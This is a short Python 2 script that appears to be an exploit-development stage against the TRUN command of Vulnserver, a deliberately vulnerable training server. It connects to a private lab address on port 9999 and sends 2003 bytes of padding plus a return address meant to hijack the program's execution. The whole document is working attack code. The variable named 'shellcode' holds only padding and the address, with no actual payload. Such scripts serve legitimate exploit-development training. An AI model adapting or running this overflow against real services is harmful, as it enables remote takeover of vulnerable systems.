#!/usr/bin/python
import sys, socket

returnaddress = "\xaf\x11\x50\x62"

shellcode = "A" * 2003 + returnaddress

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.10.162',9999))

	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()
